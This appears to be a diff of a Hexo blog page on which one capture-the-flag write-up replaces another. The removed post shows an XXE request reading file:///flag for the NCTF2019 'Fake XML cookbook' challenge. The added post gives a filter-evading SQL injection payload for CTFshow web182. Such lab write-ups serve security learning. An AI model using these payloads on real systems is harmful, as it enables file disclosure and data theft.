@@ -4,17 +4,17 @@
   <meta charset="utf-8">
   
   
-  <title>20230611 | Hexo</title>
+  <title>20230628 | Hexo</title>
   <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
-  <meta name="description" content="[NCTF2019]Fake XML cookbook ctrl+u查看源代码,发现一段 js 代码  根据 js 代码的逻辑发现是XXE传入 1234567891011121314151617181920POST &#x2F;doLogin.php HTTP&#x2F;1.1Host: 4a800570-8c38-437a-95a8-8a082d88d54c.node4.buuoj.cn:81Content-Len">
+  <meta name="description" content="web182  过滤了 flag ，使用 like 模糊查询   1-1&amp;#x27;or%0cusername%0clike%0c&amp;#x27;%fl%">
 <meta property="og:type" content="article">
-<meta property="og:title" content="20230611">
-<meta property="og:url" content="http://example.com/2023/06/11/20230611/index.html">
+<meta property="og:title" content="20230628">
+<meta property="og:url" content="http://example.com/2023/06/27/20230627/index.html">
 <meta property="og:site_name" content="Hexo">
-<meta property="og:description" content="[NCTF2019]Fake XML cookbook ctrl+u查看源代码,发现一段 js 代码  根据 js 代码的逻辑发现是XXE传入 1234567891011121314151617181920POST &#x2F;doLogin.php HTTP&#x2F;1.1Host: 4a800570-8c38-437a-95a8-8a082d88d54c.node4.buuoj.cn:81Content-Len">
+<meta property="og:description" content="web182  过滤了 flag ，使用 like 模糊查询   1-1&amp;#x27;or%0cusername%0clike%0c&amp;#x27;%fl%">
 <meta property="og:locale" content="en_US">
-<meta property="article:published_time" content="2023-06-11T15:21:59.000Z">
-<meta property="article:modified_time" content="2023-06-11T15:22:16.323Z">
+<meta property="article:published_time" content="2023-06-27T14:54:21.000Z">
+<meta property="article:modified_time" content="2023-06-27T14:55:35.489Z">
 <meta property="article:author" content="John Doe">
 <meta name="twitter:card" content="summary">
   
@@ -75,14 +75,14 @@
 </header>
 
       <div class="outer">
-        <section id="main"><article id="post-20230611" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
+        <section id="main"><article id="post-20230627" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
   <div class="article-meta">
-    <a href="/2023/06/11/20230611/" class="article-date">
-  <time class="dt-published" datetime="2023-06-11T15:21:59.000Z" itemprop="datePublished">2023-06-11</time>
+    <a href="/2023/06/27/20230627/" class="article-date">
+  <time class="dt-published" datetime="2023-06-27T14:54:21.000Z" itemprop="datePublished">2023-06-27</time>
 </a>
     
   <div class="article-category">
-    <a class="article-category-link" href="/categories/buuctf/">buuctf</a>
+    <a class="article-category-link" href="/categories/CTFshow/">CTFshow</a>
   </div>
 
   </div>
@@ -93,7 +93,7 @@
         
   
     <h1 class="p-name article-title" itemprop="headline name">
-      20230611
+      20230628
     </h1>
   
 
@@ -101,17 +101,17 @@
     
     <div class="e-content article-entry" itemprop="articleBody">
       
-        <h2 id="NCTF2019-Fake-XML-cookbook"><a href="#NCTF2019-Fake-XML-cookbook" class="headerlink" title="[NCTF2019]Fake XML cookbook"></a>[NCTF2019]Fake XML cookbook</h2><ol>
-<li><p>ctrl+u查看源代码,发现一段 js 代码</p>
-</li>
-<li><p>根据 js 代码的逻辑发现是XXE传入</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">POST /doLogin.php HTTP/1.1</span><br><span class="line">Host: 4a800570-8c38-437a-95a8-8a082d88d54c.node4.buuoj.cn:81</span><br><span class="line">Content-Length: 153</span><br><span class="line">Accept: application/xml, text/xml, */*; q=0.01</span><br><span class="line">X-Requested-With: XMLHttpRequest</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.5060.134 Safari/537.36</span><br><span class="line">Content-Type: application/xml;charset=UTF-8</span><br><span class="line">Origin: http://4a800570-8c38-437a-95a8-8a082d88d54c.node4.buuoj.cn:81</span><br><span class="line">Referer: http://4a800570-8c38-437a-95a8-8a082d88d54c.node4.buuoj.cn:81/</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.9</span><br><span class="line">Connection: close</span><br><span class="line"></span><br><span class="line">&lt;?xml version=&quot;1.0&quot;?&gt;</span><br><span class="line"></span><br><span class="line">&lt;!DOCTYPE GVI [</span><br><span class="line">    &lt;!ENTITY xxe SYSTEM &quot;file:///flag&quot; &gt;</span><br><span class="line">]&gt;</span><br><span class="line"></span><br><span class="line">&lt;user&gt;&lt;username&gt;&amp;xxe;&lt;/username&gt;&lt;password&gt;123&lt;/password&gt;&lt;/user&gt;</span><br></pre></td></tr></table></figure></li>
+        <h3 id="web182"><a href="#web182" class="headerlink" title="web182"></a>web182</h3><blockquote>
+<ol>
+<li>过滤了 <code>flag</code> ，使用 <code>like</code> 模糊查询</li>
 </ol>
+ <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-1&#x27;or%0cusername%0clike%0c&#x27;%fl%</span><br></pre></td></tr></table></figure>
+</blockquote>
 
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://example.com/2023/06/11/20230611/" data-id="clirkqqjq00006suzhbqldyro" data-title="20230611" class="article-share-link"><span class="fa fa-share">Share</span></a>
+      <a data-url="http://example.com/2023/06/27/20230627/" data-id="cljeetvrb000070uzhnjvdw8j" data-title="20230628" class="article-share-link"><span class="fa fa-share">Share</span></a>
       
       
       
@@ -121,19 +121,10 @@
     
 <nav id="article-nav">
   
-    <a href="/2023/06/13/20230613/" id="article-nav-newer" class="article-nav-link-wrap">
-      <strong class="article-nav-caption">Newer</strong>
-      <div class="article-nav-title">
-        
-          20230613
-        
-      </div>
-    </a>
   
-  
-    <a href="/2023/06/11/SYCTF2023/" id="article-nav-older" class="article-nav-link-wrap">
+    <a href="/2023/06/26/web254-278/" id="article-nav-older" class="article-nav-link-wrap">
       <strong class="article-nav-caption">Older</strong>
-      <div class="article-nav-title">SYCTF2023</div>
+      <div class="article-nav-title">web254-278</div>
     </a>
   
 </nav>
